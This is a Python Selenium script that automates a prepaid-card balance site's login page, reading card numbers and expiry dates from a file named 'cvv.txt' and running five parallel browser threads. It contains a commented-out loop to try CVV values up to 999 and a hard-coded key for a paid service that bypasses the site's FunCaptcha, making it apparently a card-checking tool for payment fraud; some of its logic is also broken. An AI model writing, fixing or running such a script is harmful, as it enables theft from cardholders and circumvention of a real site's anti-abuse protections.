import time
from telnetlib import EC

from selenium import webdriver
from threading import Thread, Barrier
from anticaptchaofficial.funcaptchaproxyless import *
import time

from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait
#C:\\Users\\flori\\OneDrive\\Desktop\\cvv.txt


def func(barrier,input_value):
    # input_value = input("Please enter path: \n")
    file = open(input_value, "r")
    num_inter = 0
    i = 0
    index = 0
    cvv = 0
    for line in file:
        fields = line.split(":")
        card = fields[0]
        month = fields[1]
        year = fields[2]

    driver = webdriver.Chrome()
    driver.set_window_size(1920, 1080)
    driver.get(url)

    time.sleep(5)
    driver.find_element_by_xpath("/html/body/app-root/app-shell/app-card-login-page/div/form/div/div/div/app-card-information/form/div[1]/div/div/input").\
        send_keys(card)

    driver.find_element_by_xpath("/html/body/app-root/app-shell/app-card-login-page/div/form/div/div/div/app-card-information/form/div[2]/div[1]/div/div/input").\
        send_keys(month + '20' +year)
    # for index in range(999):
    #     index = index + 1
    #     cvv = index
    driver.find_element_by_xpath(
        "/html/body/app-root/app-shell/app-card-login-page/div/form/div/div/div/app-card-information/form/div[2]/div[2]/div/div/input"). \
        send_keys(
        cvv)
    driver.find_element_by_xpath("/html/body/app-root/app-shell/app-card-login-page/div/form/div/div/div/div[7]/div[1]/button").click()

    time.sleep(10)
    print("sleep 5sec")
    # driver.find_element_by_id("wrongTimeout_children_button").click()
    WebDriverWait(driver ,20).until(EC.element_to_be_clickable((By.ID, "home_children_button"))).click()
    print("start solving FunCaptcha")
    barrier.wait()
    solver = funcaptchaProxyless()
    solver.set_verbose(1)
    solver.set_key("3m5mcqdbaow613yim2ztbt")
    solver.set_website_url(url)
    token = solver.solve_and_return_solution()
    if token != 0:
        print ("result token: " + token)
    else:
        print ("task finished with error " + solver.error_code)
#C:\\Users\\flori\\OneDrive\\Desktop\\cvv.txt
url = 'https://www.myprepaidcenter.com/login/card'

number_of_threads = 5

barrier = Barrier(number_of_threads)

threads = []
input_value = input("Please enter path: \n")
input_load = input("Please enter time to wait for page te be loaded :\n")
for _ in range(number_of_threads):

    t = Thread(target=func, args=(barrier,input_value))
    t.start()
    threads.append(t)

for t in threads:
    t.join()